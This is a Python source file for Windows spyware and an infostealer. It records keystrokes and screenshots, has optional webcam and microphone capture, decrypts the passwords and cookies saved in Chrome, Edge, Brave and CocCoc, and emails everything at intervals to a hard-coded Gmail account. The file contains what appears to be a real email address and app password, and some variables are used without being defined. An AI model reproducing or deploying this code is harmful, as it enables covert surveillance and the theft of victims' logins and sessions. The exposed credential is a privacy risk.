import base64
import json
import os
import time
import shutil
import sqlite3
from datetime import datetime, timedelta
from pynput.keyboard import Listener
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import mss
import cv2
import sounddevice as sd
import soundfile as sf
import numpy as np
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from threading import Thread
import socket

# Do not forget to use app passsword >> https://myaccount.google.com/u/2/apppasswords
# Written by VuQn

# Settings
sender_email = "tiennguyenmanh.0306@gmail.com"  #Enter email here
sender_password = "qpwb ccsa dpuq gkht"         #Enter app password of email here
receiver_email = sender_email                   #Enter receiver email here
mail_interval = 300                             #Adjust the time between each email send
save_interval = 10                              #Adjust the time between each file save

# Name of folder
folder_path = "C:\\Users\\Public\\Public 3D Objects\\"
screenshots_folder = folder_path + "screenshots"
webcam_folder = folder_path + "webcam_images"
audio_folder = folder_path + "audio_files"
keylog_folder = folder_path + "keylogs"
computer_name = socket.gethostname()

if not os.path.exists(screenshots_folder):
    os.makedirs(screenshots_folder)
if not os.path.exists(webcam_folder):
    os.makedirs(webcam_folder)
if not os.path.exists(audio_folder):
    os.makedirs(audio_folder)
if not os.path.exists(keylog_folder):
    os.makedirs(keylog_folder)

def check_image_size(image_path):
    return os.path.getsize(image_path) > 2 * 1024 * 1024  # 2MB

def capture_and_save_screen(output_folder):
    while True:
        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
        with mss.mss() as sct:
            screenshot_path = os.path.join(output_folder, f"screenshot_{current_time}.png")
            sct.shot(output=screenshot_path)
            screenshot_count += 1
        # Kiểm tra dung lượng ảnh đầu tiên
        if screenshot_count == 1 and check_image_size(screenshot_path):
            save_interval = 5
        time.sleep(save_interval)

def capture_and_save_webcam(output_folder):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
        image_path = os.path.join(output_folder, f"webcam_{current_time}.png")
        cv2.imwrite(image_path, frame)
        time.sleep(save_interval)
    cap.release()
    
def get_folder_size(folder):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            total_size += os.path.getsize(filepath)
    return total_size

def record_and_save_audio(output_folder):
    while True:
        record_duration = 30  #Duration of each audio recording
        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
        audio_path = os.path.join(output_folder, f"audio_{current_time}.wav")
        audio_data = sd.rec(int(record_duration * 22050), samplerate=22050, channels=2, dtype='int16')
        sd.wait()
        rms = np.sqrt(np.mean(audio_data**2))
        if rms > 0.6:   #Increases if the audio file has a lot of environmental noise 
            sf.write(audio_path, audio_data, 22050, 'PCM_16')

def send_files_email(sender_email, sender_password, receiver_email, files_folder):
    files = [f for f in os.listdir(files_folder) if os.path.isfile(os.path.join(files_folder, f))]

    if files:
        current_date = datetime.now().strftime("%d %m %Y")
        subject = f"{computer_name}: {files_folder.replace(folder_path, '')} taken on {current_date}"
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        for file_name in files:
            file_path = os.path.join(files_folder, file_name)
            with open(file_path, "rb") as attachment:
                part = MIMEApplication(attachment.read(), Name=os.path.basename(file_path))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(file_path)}"'
                msg.attach(part)
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())

def split_and_send_email(sender_email, sender_password, receiver_email, folder):
    total_size = get_folder_size(folder)
    max_size = 25 * 1024 * 1024  # 25MB in bytes

    if total_size > max_size:
        # Split folder into two halves
        half_size = total_size // 2
        files = [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]
        current_size = 0
        split_folders = []

        for file in files:
            file_path = os.path.join(folder, file)
            current_size += os.path.getsize(file_path)

            if current_size > half_size:
                # Move files to new split folder
                split_folder = os.path.join(folder, "split_folder")
                os.makedirs(split_folder, exist_ok=True)
                split_folders.append(split_folder)
                for f in files:
                    shutil.move(os.path.join(folder, f), split_folder)
                break

        # Send emails with split folders
        for split_folder in split_folders:
            send_files_email(sender_email, sender_password, receiver_email, split_folder)
            shutil.rmtree(split_folder)
    else:
        send_files_email(sender_email, sender_password, receiver_email, folder)

def delete_all_files(folder):
    for file_name in os.listdir(folder):
        file_path = os.path.join(folder, file_name)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                os.rmdir(file_path)
        except Exception as e:
            pass

appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
}
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    }
}
def get_master_key(path: str):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if not os.path.exists(folder_path + browser_name):
        os.mkdir(folder_path + browser_name)
    if content is not None:
        open(f'{folder_path + browser_name}/{type_of_data}_{browser_name}.txt', 'w', encoding="utf-8").write(content)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

if True:
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            try:
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)
            except:
                pass
        send_files_email(sender_email, sender_password, receiver_email, folder_path + browser)

def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    func_keys = ["Key.esc", "Key.caps_lock", "Key.tab", "Key.ctrl_r", "Key.shift_r", "Key.alt_gr", "Key.alt_l", "Key.cmd ", "Key.ctrl_l", "�", "Key.delete", "Key.shift", "\\x03", "\\x16", "\\x1a", "\\x01","\\x13", "Key.num_lock", "\\x18"]
    numb_keys = ["<96>", "<97>", "<98>", "<99>", "<100>", "<101>", "<102>", "<103>", "<104>", "<105>"]
    retained_keys = ["Key.down", "Key.up", "Key.right", "Key.left", "Key.backspace"]
    try:
        if key in func_keys:
            key = ""
        elif key in numb_keys:
            key = str(numb_keys.index(key))
        elif key == "Key.enter":
            key = "\n"
        elif key == "Key.space":
            key = " "
        elif key == "<110>":
            key = "."
        elif key in retained_keys: 
            key = key.replace("Key.", "")
            key = "[" + key + "]"
        with open(os.path.join(keylog_folder, "keylog.txt"), "a", encoding='utf-8') as log_file:
            log_file.write(key)
    except:
        pass
def keylog_join():
    with Listener(on_press=on_press) as keylogger:
        keylogger.join()

screen_thread = Thread(target=capture_and_save_screen, args=(screenshots_folder,))
# webcam_thread = Thread(target=capture_and_save_webcam, args=(webcam_folder,))
# audio_thread = Thread(target=record_and_save_audio, args=(audio_folder,))
keylogger_thread = Thread(target=keylog_join)

screen_thread.start()
# webcam_thread.start()
# audio_thread.start()
keylogger_thread.start()

while True:
    time.sleep(mail_interval)
    
    split_and_send_email(sender_email, sender_password, receiver_email, screenshots_folder)
    # split_and_send_email(sender_email, sender_password, receiver_email, webcam_folder)
    send_files_email(sender_email, sender_password, receiver_email, audio_folder)
    send_files_email(sender_email, sender_password, receiver_email, keylog_folder)
    
    delete_all_files(screenshots_folder)
    # delete_all_files(webcam_folder)
    # delete_all_files(audio_folder)
    delete_all_files(keylog_folder)
